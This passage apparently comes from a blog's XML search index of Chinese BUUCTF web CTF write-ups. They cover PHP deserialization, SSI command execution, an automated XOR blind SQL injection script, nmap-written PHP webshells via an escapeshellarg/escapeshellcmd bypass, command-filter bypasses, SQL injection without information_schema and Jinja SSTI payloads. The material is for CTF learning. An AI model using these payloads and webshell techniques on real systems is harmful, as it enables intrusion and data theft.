1O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D 提交 1PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezIzN2Q3ODUzLWE3NDUtNGU4OS1hODk0LTFjODA4NGJkMzBmY30iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+ 解码 在构造序列化的时候，创建了两次show对象，在之前都只是创建一次，而这里创建两次是因为创建一次的话，并不会调用到其他的类。 一道题看一天，看下来，还是有些懵的感觉。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【BJDCTF2020】EasySearch 1]]></title>
    <url>%2F2021%2F04%2F16%2F%5BBJDCTF2020%5DEasySearch%201%2F</url>
    <content type="text"><![CDATA[考点：SSI（服务端包含）题打开 发现又是一道登录题，肯定先想到sql注入，各种报错测试，都只是返回一个框。 扫目录，直接就是dirsearch开扫 123456789101112131415F:\Tools\WEB\Python-Tools\dirsearch-master&gt;python3 dirsearch.py -u "http://82e12f9d-f5e7-44cd-b5bc-13e1f75f81a9.node3.buuoj.cn" -t 10 -s 1 _|. _ _ _ _ _ _|_ v0.4.1 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 10 | Wordlist size: 10849Error Log: F:\Tools\WEB\Python-Tools\dirsearch-master\logs\errors-21-04-16_16-37-46.logTarget: http://82e12f9d-f5e7-44cd-b5bc-13e1f75f81a9.node3.buuoj.cn/Output File: F:\Tools\WEB\Python-Tools\dirsearch-master\reports\82e12f9d-f5e7-44cd-b5bc-13e1f75f81a9.node3.buuoj.cn\_21-04-16_16-37-46.txt[16:37:46] Starting:[16:37:46] 200 - 1KB - /index.php.swp 得到一个index.php.swp 文件，这里有一个问题，就是开了代理去扫，是扫不出来这个文件的，我也老是忘记关代理。 得到 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php ob_start(); function get_hash()&#123; $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); &#125; header("Content-Type: text/html;charset=utf-8"); *** if(isset($_POST['username']) and $_POST['username'] != '' ) &#123; $admin = '6d0bc1'; # 弱类型 只需要找到 md5加密后前6位跟 6d0bc1 相同即可 if ( $admin == substr(md5($_POST['password']),0,6)) &#123; echo "&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"; # 构建文件路径 $file_shtml = "public/".get_hash().".shtml"; # 创建文件 $shtml = fopen($file_shtml, "w") or die("Unable to open file!"); # $text = ' *** *** &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt; *** ***'; # 将 变量$text 的内容 写入 $shtml 文件 fwrite($shtml,$text); # 关闭文件 fclose($shtml); *** echo "[!] Header error ..."; &#125; else &#123; echo "&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"; &#125;else &#123; *** &#125; ***?&gt; 第一个条件是 if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) ，$admin = &#39;6d0bc1&#39;; ，要求是md5加密某个字符串，然后截取前6位，得到的结果要 与 $admin 相等。 上脚本 1234567import hashlibfor i in range(100000000000): a = hashlib.md5(str(i).encode('utf-8')).hexdigest() if a[0:6] == '6d0bc1': print(i) 123F:\Tools\WEB\Python-Tools&gt;python3 ctf-指定hash计算.py20206662305004 两个都能用。 接下来就是最关键的地方了 1234567891011121314$file_shtml = "public/".get_hash().".shtml";# 创建文件$shtml = fopen($file_shtml, "w") or die("Unable to open file!");# $text = ' *** *** &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt; *** ***';# 将 变量$text 的内容 写入 $shtml 文件fwrite($shtml,$text);# 关闭文件fclose($shtml); 大概意思就是，会创建一个包含路径的shtml 文件，会将$_POST[&#39;username&#39;]的值写入到文件中，然后保存，关闭。包含路径的文件会返回到Respone头中。 大概了解了下，这个属于SSI漏洞，相当于是可用执行命令，通过规定的语法。 直接payload 1&lt;!--#exec cmd=&quot;find / --name flag*&quot;--&gt; 12POSTusername=%3C%21--%23exec+cmd%3D%22find+%2F+-name+flag*%22--%3E&amp;password=2305004 打开 1public/34fb7252b9dff84b7edd3685b1c691fdd6293a00.shtml 再一次提交 12POSTusername=&lt;!--#exec cmd=&quot;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=2305004]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【NPUCTF2020】ReadlezPHP 1]]></title>
    <url>%2F2021%2F04%2F16%2F%5BNPUCTF2020%5DReadlezPHP%201%2F</url>
    <content type="text"><![CDATA[反序列化和代码执行12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = "Y-m-d h:i:s"; $this-&gt;b = "date"; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET['source']))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET["data"]); 这道题，我先是用 system(ls) 去查看文件，发现不回显，又用scandir(&#39;/&#39;)，查看根目录文件，发现还是不回显，网上搜到 glob函数可用搜索文件，结果发现还是不回显，找了下原因，因为这两个函数返回的都是数组，用 echo 输出，只显示 array。我直接用file_get_contents(&#39;/flag&#39;)去根目录下读取flag，发现回显空白。我就很纳闷了，也不知道flag放在那个位置，无奈，看别人wp。用assert(phpinfo()) 输出php配置信息，flag 就在里面。 1?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125; 别人的wp基本就只有这一个思路，一点创新都没有。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化</tag>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【极客大挑战 2019】FinalSQL 1]]></title>
    <url>%2F2021%2F04%2F15%2F%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL%201%2F</url>
    <content type="text"><![CDATA[考点：异或盲注payload 12345678获取表名1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&gt;0)^1[*] F1naI1y,Flaaaaag~猜测列名1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='表名')),1,1))&gt;0)^1猜测值1^(ord(substr((select(group_concat(列名))from(表名)),1,1))&gt;0)^1 二分查找 12345678910111213141516arr = [i for i in range(33,127)]start = 0end = len(arr) + 1item = 97while start &lt;= end:mid = (start+end)//2if arr[mid] &lt; item: start = mid + 1elif arr[mid] &gt; item: end = mid -1 elif arr[mid] == item: print('[+] mid='+str(mid)) breakprint("end") 上脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import requestsimport timedef ascii_str(): #生成库名表名字符所在的字符列表字典 str_list=[] for i in range(33,127):#所有可显示字符 str_list.append(chr(i)) #print('可显示字符：%s'%str_list) return str_list #返回字符列表def exp_table_name(url): # 猜解表名 arr_str = ascii_str() table_name = "" for i in range(1,20): for s in arr_str: payload = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%s)^1"%(i, ord(s)) payload_url = url + payload print(payload) time.sleep(1) resp = requests.get(payload_url, timeout=10) if "Click" in resp.text: # print("[*] " + s) break table_name += s print("[*] " + table_name) return table_namedef exp_column_name(url): str_arr = ascii_str() column_name = "" for i in range(1,100): for s in str_arr: payload = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))=%s)^1"%(i, ord(s)) payload_url = url + payload print(payload) time.sleep(1) resp = requests.get(payload_url, timeout=10) if "Click" in resp.text: # print("[+] " + s) column_name += s break print("[+] " + column_name) return column_namedef exp_column_value(url): # 猜解单个字段值 arr_str = ascii_str() column_value = "" for i in range(100, 200): for s in arr_str: payload = "1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))=%s)^1"%(i, ord(s)) payload_url = url + payload time.sleep(1) print(payload) resp = requests.get(payload_url) if "Click" in resp.text: # print("[+] " + s) column_value += s break print("[*] " + column_value) return column_value if __name__=='__main__': url = "http://d306a06c-16fb-4f1b-8cc1-96da2f301860.node3.buuoj.cn/search.php?id=" # exp_table_name(url) # [*] F1naI1y,Flaaaaag~ # exp_column_name(url) # id, username, password exp_column_value(url) 这个脚本特别慢，特别是最后猜测字典的时候，差不多有两百来位，可能要猜一天，只好研究一下怎么把二分查找运用到盲注脚本中来。 二分查找逻辑二分查找是不断根据提交两个数的中间值后的反馈来不断更换查找边界来找到目标值，比如，我们需要在1-1000之间查找 666，提交中间值 500，发现小于目标数666，就会把最开始 start 的边界换成500，然后再继续提交中间数750，发现大于目标数666，就会把末尾的 end 换成 750 ，不断改变不断的改变边界变量，直到找到。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import requestsimport timedef exp_column_value(url, i, mid): # 猜解单个字段值 payload = "1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;=%s)^1"%(i,mid) payload_url = url + payload time.sleep(1) print(payload) resp = requests.get(payload_url) # 如果能够执行下列语句 则代表着 大于或等于 if "Click" in resp.text: # 再次进行判断 payload = "1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))=%s)^1"%(i,mid) payload_url = url + payload time.sleep(1) print(payload) resp = requests.get(payload_url) if "Click" in resp.text: # 拿到目标数 return 200 else: # 小于目标值 return 203 # 大于目标值 else: return 400def exp(url): column_value = "" for i in range(1,300): start = 33 end = 127 while start &lt;= end: mid = (start + end) // 2 res = exp_column_value(url,i,mid) print("[*] 返回码：" + str(res)) # 代表找到 if res == 200: print("[+] mid = "+str(mid)) column_value += chr(mid) break # 代表是小于字符ascii码值 elif res == 203: start = mid + 1 # 代表是大于 ascii码值 elif res == 400: end = mid - 1 print("[+] " + column_value) if __name__=='__main__': url = "http://4b10de77-d978-4a22-82f7-e983cfefa564.node3.buuoj.cn/search.php?id=" exp(url) 加上time.sleep(1) 是因为BUUCTF有限制，如果不加几分钟就跑出来了，用算法和不用算法对比起来，算法效率真高。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>异或注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【网鼎杯 2020 朱雀组】Nmap 1]]></title>
    <url>%2F2021%2F04%2F14%2F%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap%201%2F</url>
    <content type="text"><![CDATA[通过nmap -oN -oG 参数 写马1234567891011121314151617181920if (isset($_POST['host'])): if (!defined('WEB_SCANS')) &#123; die('Web scans disabled'); &#125; $host = $_POST['host']; if(stripos($host,'php')!==false)&#123; die("Hacker..."); &#125; $host = escapeshellarg($host); $host = escapeshellcmd($host); $filename = substr(md5(time() . rand(1, 10)), 0, 5); $command = "nmap ". NMAP_ARGS . " -oX " . RESULTS_PATH . $filename . " " . $host; $result_scan = shell_exec($command); if (is_null($result_scan)) &#123; die('Something went wrong'); &#125; else &#123; header('Location: result.php?f=' . $filename); &#125; 拿到flag payload 过滤了php 关键字 1234第一种'&lt;?=eval($_GET[a]);?&gt; -oN flag.phtml '第二种'&lt;?=eval($_GET[a]);?&gt; -oG flag.phtml ' 1?a=system("cat /flag"); 两个知识点Nmap 通过 -oG -oN 参数写 shell123456789101112131415161718192021222324252627&gt; nmap 127.0.0.1 -p 0-1 "&lt;?php eval($_GET['cmd']);?&gt;" -oN cmd.phpStarting Nmap 7.70 ( https://nmap.org ) at 2021-04-14 16:51 ?D1ú±ê×?ê±??Failed to resolve "&lt;?php eval($_GET['cmd']);?&gt;".Failed to resolve "&lt;?php eval($_GET['cmd']);?&gt;".Skipping SYN Stealth Scan against xmind.net (127.0.0.1) because Windows does not support scanning your own machine (localhost) this way.Nmap scan report for xmind.net (127.0.0.1)Host is up.PORT STATE SERVICE0/tcp unknown unknown1/tcp unknown tcpmuxFailed to resolve "&lt;?php eval($_GET['cmd']);?&gt;".Nmap done: 1 IP address (1 host up) scanned in 4.64 secondsC:\Users\root\Desktop&gt; dir 驱动器 C 中的卷是 Win10 卷的序列号是 C037-0A2C C:\Users\root\Desktop 的目录2021/04/14 16:51 &lt;DIR&gt; .2021/04/14 16:51 &lt;DIR&gt; ..2021/04/14 16:51 528 cmd.php # 生成了cmd.php 文件 1 个文件 528 字节 2 个目录 7,621,890,048 可用字节 生成的文件会将 &quot;&lt;?php eval($_GET[&#39;cmd&#39;]);?&gt;&quot; 和 扫描的结果 一起写入cmd.php文件中 ， 1nmap 127.0.0.1 -p 0-1 "&lt;?php eval($_POST['cmd']);?&gt;" -oG cmd.php 123456789101112131415161718192021&gt; nmap 127.0.0.1 -p 0-1 "&lt;?php eval($_POST['cmd']);?&gt;" -oG cmd.phpStarting Nmap 7.70 ( https://nmap.org ) at 2021-04-14 16:56 ?D1ú±ê×?ê±??Failed to resolve "&lt;?php eval($_POST['cmd']);?&gt;".Failed to resolve "&lt;?php eval($_POST['cmd']);?&gt;".Skipping SYN Stealth Scan against xmind.net (127.0.0.1) because Windows does not support scanning your own machine (localhost) this way.Nmap scan report for xmind.net (127.0.0.1)Host is up.PORT STATE SERVICE0/tcp unknown unknown1/tcp unknown tcpmuxFailed to resolve "&lt;?php eval($_POST['cmd']);?&gt;".Nmap done: 1 IP address (1 host up) scanned in 4.59 secondsC:\Users\root\Desktop&gt; cat cmd.php# Nmap 7.70 scan initiated Wed Apr 14 16:56:04 2021 as: F:\Tools\WEB\PentestBox\bin\Nmap\nmap.exe -p 0-1 -oG cmd.php 127.0.0.1 &lt;?php eval($_POST['cmd']);?&gt;Host: 127.0.0.1 (xmind.net) Status: UpHost: 127.0.0.1 (xmind.net) Ports: 0/unknown/tcp/////, 1/unknown/tcp//tcpmux///# Nmap done at Wed Apr 14 16:56:08 2021 -- 1 IP address (1 host up) scanned in 4.59 seconds 顺便说一下，nmap的其他参数 ，比如-oX，也会创建文件，但是符合会被替换成html字符，想这样 &amp;lt;?php eval($_POST[&amp;apos;cmd&amp;apos;]);?&amp;gt;，也就是说只有两种参数能用。 sescapeshellarg和escapeshellcmd 同时使用照成的问题12345&lt;?php $str = "sys'tem"; echo escapeshellarg($str);?&gt;// 'sys'\''tem' 直接将 &#39; 转义成了 &#39;\&#39;&#39; 123456&lt;?php $str = "sys'tem"; echo escapeshellcmd($str);?&gt;// sys\'tem 将 &#39; 转义成了 \&#39; 最后将两个函数同时使用 12345678&lt;?php $str = "sys'tem"; $str = escapeshellarg($str); $str = escapeshellcmd($str); echo $str;?&gt;// 'sys'\\''tem\'// sys\tem' 这里的问题就很明显了，两个函数同时使用，会照成某些字符串逃逸。 1234567891011&lt;?php $host = ' &lt;?php eval($_POST["cmd"]);?&gt; -oN cmd.php '; $host = escapeshellarg($host); $host = escapeshellcmd($host); $command = "nmap ". $host; echo $command;?&gt; // nmap ' \&lt;\?php eval\(\$_POST\[\"cmd\"\]\)\;\?\&gt; -oN cmd.php '// nmap ' &lt;?php eval($_POST["cmd"]);?&gt; -oN cmd.php ']]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>escapeshellarg/escapeshellcmd绕过</tag>
        <tag>参数注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【WUSTCTF2020】朴实无华 1]]></title>
    <url>%2F2021%2F04%2F14%2F%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%201%2F</url>
    <content type="text"><![CDATA[代码审计和命令注入代码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader('Content-type:text/html;charset=utf-8');error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET['num']))&#123; $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"; &#125;else&#123; die("金钱解决不了穷人的本质问题"); &#125;&#125;else&#123; die("去非洲吧");&#125;//level 2if (isset($_GET['md5']))&#123; $md5=$_GET['md5']; if ($md5==md5($md5)) echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"; else die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");&#125;else&#123; die("去非洲吧");&#125;//get flagif (isset($_GET['get_flag']))&#123; $get_flag = $_GET['get_flag']; if(!strstr($get_flag," "))&#123; $get_flag = str_ireplace("cat", "wctf2020", $get_flag); echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"; system($get_flag); &#125;else&#123; die("快到非洲了"); &#125;&#125;else&#123; die("去非洲吧");&#125;?&gt; 三个地方的绕过 12345678$num = '1e5'; # payload # 1e5 if(intval($num) &lt; 2020&amp;&amp;intval($num +1)&gt;2021)&#123; echo 'yes'; echo $num + 1; &#125;// yes100001 1e5为100000的科学计数法，将1e5 作为参数放入intval函数内执行会返回结果 1 , 将1e5 加上 1后，其结果为100001，在将100001放入intval，结果自然为100001，成功绕过。 1234567891011$md5=$_GET['md5']; # payload # 空数组 # 0e215962017 echo $md5; if ($md5==md5($md5))&#123; echo "ok"; echo $md5; &#125;else&#123; echo $md5; &#125; 这里的绕过其实有两种方式，我在网上看到的教程大部分都是用 0e215962017 字符串绕过，这串字符经过md5加密后，会得到前两位是 0e 开头的字符串，在经过 == 的比较，就会返回为真。 还有一个方式就是空数组，这个方法在直接在代码里赋值是成立的，但是通过GET传参 md5[]= ，就不能显示，具体原因无从得知，md5对数组加密后会返回Flase ，再与空数组进行比较，会相等。 12345678$get_flag = $_GET['get_flag']; if(!strstr($get_flag," "))&#123; $get_flag = str_ireplace("cat", "wctf2020", $get_flag); echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"; system($get_flag); &#125;else&#123; die("快到非洲了"); &#125; 不能有空格，cat会被替换成wctf2020，空格代替方式有很多 ${IFS} ${IFS}$9 &lt; 都可用代替空格，cat的代替方式也很多， more tac cat less head tail ，如果是被替换，还可用通过混淆来绕过，比如，cat 被过滤，通过c&quot;at 来绕过。 最终payload 1fl4g.php?num=1e5&amp;md5=0e215962017&amp;get_flag=c""at&lt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>代码审计</tag>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【SWPU2019】Web1 1]]></title>
    <url>%2F2021%2F04%2F13%2F%5BSWPU2019%5DWeb1%201%2F</url>
    <content type="text"><![CDATA[考点：无information_schema表注入二次注入 流程注册-&gt;登录-&gt;发布广告-&gt;查看广告 payload 123456789101112131415161'/**/group/**/by/**/22,'1-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22-1'/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22web1 root@localhost-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22ads,users-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'223,flag&#123;fdc63c44-aae2-43da-9890-38992f50d843&#125;,53e217ad4c721eb9565cf25a5ec3b66e,098f6bcd4621d373cade4e832627b4f6,202cb962ac59075b964b07152d234b70select group_concat(b) from (select 1,2,3 as b union select * from users)a 学到了两种新姿势 information_schemab.tables 被过滤 1information_schemab.tables 替代表 mysql.innodb_table_statstable_schema 换成 database_name 只知道表名的情况下查询数据 1(select `2` from (select 1,2,3 union select * from table_name)a) //前提是要知道表名((select c from (select 1,2,3 as c union select * from users)b)) 1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>二次注入</tag>
        <tag>无information_schema表注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【WesternCTF2018】shrine 1]]></title>
    <url>%2F2021%2F04%2F13%2F%5BWesternCTF2018%5Dshrine%201%2F</url>
    <content type="text"><![CDATA[SSTI注入题123456789101112131415161718192021222324252627282930313233343536import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): # Python replace() 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。 # 将( 和 ) 替换成 '' s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s # render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。 return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True)# payload# "".__class__# &#123;config['FLAG']&#125;&#125;# &#123;&#123;config.FLAG&#125;&#125;# &#123;&#123;url_for.__globals__['current_app'].config.FLAG&#125;&#125;# &#123;&#123;get_flashed_messages.__globals__['current_app'].config.FLAG&#125;&#125;# &#123;&#123;request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']&#125;&#125; 可用payload 1&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config.FLAG&#125;&#125; 1&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config.FLAG&#125;&#125;]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【安洵杯 2019】easy_serialize_php 1]]></title>
    <url>%2F2021%2F04%2F10%2F%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php%201%2F</url>
    <content type="text"><![CDATA[考点：php反序列化字符长度逃逸分析1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 &lt;?php$function = @$_GET['f'];# 将变量$img 的内容中带有php flag php5 php4 fl1g 的字符串 替换成 '' 空字符function filter($img)&#123; $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);&#125;if($_SESSION)&#123; # 销毁$_SESSION 数组变量 unset($_SESSION);&#125;$_SESSION["user"] = 'guest';$_SESSION['function'] = $function;# 变量覆盖 意味着可以重置$_SESSION数组变量extract($_POST);# 如果$function 为空 则显示下面的代码 就是刚刚打开的时候显示的内容 意味着$function 没传入内容if(!$function)&#123; echo '&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;';&#125;# $_GET['img_path'] 为空情况下会默认给定一个图片文件名 然后进行base64编码 赋值给SESSIONif(!$_GET['img_path'])&#123; $_SESSION['img'] = base64_encode('guest_img.png');&#125;else&#123; # GET方式接收一个文件名 会进行base64编码 在此基础上还会进行sha1 加密 想从此处读取flag是不太可能 $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));&#125;# 序列化SESSION 并对序列化内容进行过滤# 一般到这就会意识到问题存在 php序列化长度变化导致字符串逃逸$serialize_info = filter(serialize($_SESSION));# 给了三个分支 # highlight_file 显示源代码# phpinfo 可以查看php信息# show_imgage 对$serialize_info 进行序列化if($function == 'highlight_file')&#123; highlight_file('index.php');&#125;else if($function == 'phpinfo')&#123; eval('phpinfo();'); //maybe you can find something in here!&#125;else if($function == 'show_image')&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img']));&#125; 查看php信息 发现了特殊文件名d0g3_f1ag.php 1234567$_SESSION["user"] = 'guest';$_SESSION['function'] = 'a';$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA=='; // d0g3_f1ag.php base64编码var_dump(serialize($_SESSION));// 得到string(90) "a:3:&#123;s:4:"user";s:5:"guest";s:8:"function";s:1:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;" 可控参数为user 和 function ，序列化后会将 flag 过滤为 空字符串, 123$_SESSION["user"] = 'flagflagflagflagflagflag';$_SESSION['function'] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;';$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA=='; // d0g3_f1ag.php base64编码 ​ 序列化后 1a:3:&#123;s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125; 这里会将flag字符串过滤，过滤后结果 1a:3:&#123;s:4:"user";s:24:"#";s:8:"function";s:59:"a#";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125; 由于s:24 会往后边读取24位字符&quot;;s:8:&quot;function&quot;;s:59:&quot;a做为user的属性值, #号包含起来的部分，读取到a的时候结束，后面的;进行了闭合，相当于吞掉了一个属性和值，接着会继续读取我们构造的img，由于总共三个属性，我在后边加上了一个属性和值，后边的序列化结果直接就被丢弃。 提交1234GET:show_imagePOST:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125; 得到 12345&lt;?php$flag = 'flag in /d0g3_fllllllag';?&gt; /d0g3_fllllllag base64编码 L2QwZzNfZmxsbGxsbGFn 提交 1234GET:show_imagePOST:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";&#125; 得到flag 又是一道反序列字符绕过闭合 与上一题不一样的是，上一题是增加字符，这道题是删除字符。 where-&gt; hacker flag -&gt; ‘’ 同样的原理是，将字符数组序列化后，得到一个固定格式的序列化字符串，但是这个序列化字符串被放入某个函数中进行过滤，过滤后，即原本的固定格式没有变，但是里面某些字符被函数中的规则过滤，有可能是增加，有可能会减少，不管怎么样，只要能控制即将被序列化的变量，那么就有可能自己来构建序列化字符串。 payload 123456_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;GET：show_imagePOST：_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【0CTF 2016】piapiapia 1]]></title>
    <url>%2F2021%2F04%2F10%2F%5B0CTF%202016%5Dpiapiapia%201%2F</url>
